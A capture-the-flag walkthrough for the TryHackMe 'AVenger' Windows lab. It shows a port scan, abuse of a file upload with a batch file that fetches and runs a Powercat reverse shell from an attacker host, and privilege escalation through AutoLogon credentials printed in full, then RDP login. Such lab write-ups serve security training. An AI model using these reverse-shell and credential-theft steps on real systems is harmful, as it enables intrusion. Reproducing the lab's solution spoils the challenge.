# [AVenger](https://tryhackme.com/room/avenger)

## You’ve been asked to exploit all the vulnerabilities present.

# Find all the flags

Welcome, brave cyber warriors, to the Avenger Training Cyber Security Capture the Flag! Prepare yourselves for a wild and wacky adventure through the treacherous realm of cyberspace.

Your mission, should you choose to accept it (and trust us, you want to), is to outsmart the devious cyber villains, snatch their flags, and assert your dominance as the reigning champions of cyber security. But be warned, the villains won't make it easy for you!

You'll need more than just technical expertise to triumph in this whimsical battle. Think outside the box, unleash your inner prankster, and find unconventional solutions to outwit your opponents. Remember, even the most formidable challenges can be conquered with a healthy dose of laughter and an ingenious trick up your sleeve.

Just a final reminder that AV is enabled, and everything should be patched!

### Which is the user flag?

1. Start with a comprehensive port scan to enumerate all open ports and running services on the target machine:

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.5K  2022-06-15 16:07  applications.html
| 177   2022-06-15 16:07  bitnami.css
| -     2023-04-06 09:24  dashboard/
| 30K   2015-07-16 15:32  favicon.ico
| -     2023-06-27 09:26  gift/
| -     2023-06-27 09:04  img/
| 751   2022-06-15 16:07  img/module_table_bottom.png
| 337   2022-06-15 16:07  img/module_table_top.png
| -     2023-06-28 14:39  xampp/
|_
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.5K  2022-06-15 16:07  applications.html
| 177   2022-06-15 16:07  bitnami.css
| -     2023-04-06 09:24  dashboard/
| 30K   2015-07-16 15:32  favicon.ico
| -     2023-06-27 09:26  gift/
| -     2023-06-27 09:04  img/
| 751   2022-06-15 16:07  img/module_table_bottom.png
| 337   2022-06-15 16:07  img/module_table_top.png
| -     2023-06-28 14:39  xampp/
|_
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Index of /
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 5.5.5-10.4.28
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.4.28-MariaDB
|   Thread ID: 9
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolOld, SupportsCompression, ODBCClient, FoundRows, IgnoreSigpipes, SupportsTransactions, Support41Auth, LongColumnFlag, Speaks41ProtocolNew, InteractiveClient, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsLoadDataLocal, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: Z>iv4?|xer-%o$`89Sw~
|_  Auth Plugin Name: mysql_native_password
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: GIFT
|   NetBIOS_Domain_Name: GIFT
|   NetBIOS_Computer_Name: GIFT
|   DNS_Domain_Name: gift
|   DNS_Computer_Name: gift
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-30T18:36:46+00:00
|_ssl-date: 2026-04-30T18:36:55+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=gift
| Not valid before: 2026-04-29T17:18:24
|_Not valid after:  2026-10-29T17:18:24
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: localhost, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-04-30T18:36:47
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

2. Add an entry to the `hosts` file to map the target IP to the discovered hostname `avenger.tryhackme`:

```bash
echo "<TARGET_IP> avenger.tryhackme" >> /etc/hosts
```

3. Navigate to `http://avenger.tryhackme/gift/` in a web browser. Explore the page thoroughly by scrolling down to discover a form panel labeled `Request your training`. This form contains a file upload field that accepts files for submission.

4. The file upload functionality suggests an arbitrary file upload vulnerability. Since this is a Windows machine running XAMPP, batch files will be automatically executed by the Windows Task Scheduler or a scheduled task if placed in certain directories. Create a PowerShell-based reverse shell payload using Powercat. The payload is first generated with base64 encoding to bypass potential antivirus detection, then saved to `shell.txt`:

```bash
pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c <ATTACKER_IP> -p 4444 -e cmd.exe -ge" > shell.txt
```

5. Create a batch file named `exp.bat` that will download and execute the encoded Powercat reverse shell payload. This batch file leverages PowerShell to fetch `shell.txt` from the attacker's HTTP server and execute the encoded payload. The `START /B` command runs the PowerShell process in the background to avoid blocking:

```bat
START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('http://<ATTACKER_IP>:8000/shell.txt');iex 'powershell -E $code'
```

6. Start a Python HTTP server on the attacking machine to host the `shell.txt` payload file:

```bash
python3 -m http.server
```

7. Set up a Netcat listener on the attacking machine to catch the incoming reverse shell connection from the target:

```bash
nc -lvnp 4444
```

8. Upload the `exp.bat` file through the `Request your training` form at `http://avenger.tryhackme/gift/`. After submission, the file is stored on the server and likely processed by an automated task or cron job that executes batch files.

9. Wait for the reverse shell connection to establish. Once connected, navigate to the user's Desktop directory and retrieve the user flag:

```bash
cd C:\Users\hugo\Desktop
dir
type user.txt
```

<img width="616" height="361" alt="SCREEN01" src="https://github.com/user-attachments/assets/215a5dfe-4072-4fa5-821b-68724cbab2c5" />

---

### Which is the root flag?

1. Check the current user's group memberships to identify potential privilege escalation vectors:

```bash
whoami /groups
```

**Results:**

```
GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
BUILTIN\Remote Desktop Users                                  Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users                               Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
```

2. Upgrade to a PowerShell session for better scripting capabilities and easier privilege escalation enumeration:

```bash
powershell
```

3. Download the PowerUp privilege escalation script from GitHub. PowerUp is a PowerShell tool that automates common Windows privilege escalation checks, including registry autologon credentials, unquoted service paths, weak service permissions, and more:

```bash
wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
```

4. Import the PowerUp module and run all privilege escalation checks to identify potential vulnerabilities:

```bash
(New-Object System.Net.Webclient).DownloadString('http://<ATTACKER_IP>:8000/PowerUp.ps1') > PowerUp.ps1
. .\Powerup.ps1
Invoke-AllChecks
```

**Results:**

```
DefaultDomainName    :
DefaultUserName      : hugo
DefaultPassword      : SurpriseMF123!
AltDefaultDomainName :
AltDefaultUserName   :
AltDefaultPassword   :
```

> PowerUp successfully discovered AutoLogon credentials stored in the Windows registry at `HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`. The credentials belong to the user `hugo` with password `SurpriseMF123!`. Since `hugo` is a member of the Administrators group, we can use these credentials to authenticate via RDP and obtain a full administrative session.

5. Use `xfreerdp` to establish a Remote Desktop connection to the target machine using the discovered credentials:

```bash
xfreerdp /v:<TARGET_IP> /u:hugo /p:'SurpriseMF123!' /cert:ignore
```

6. Once logged in via RDP, navigate to the Administrator's Desktop directory and open the root flag file:

<img width="1030" height="801" alt="SCREEN02" src="https://github.com/user-attachments/assets/9a124c37-a3ae-40c9-9d47-9c1a1b0b49ed" />
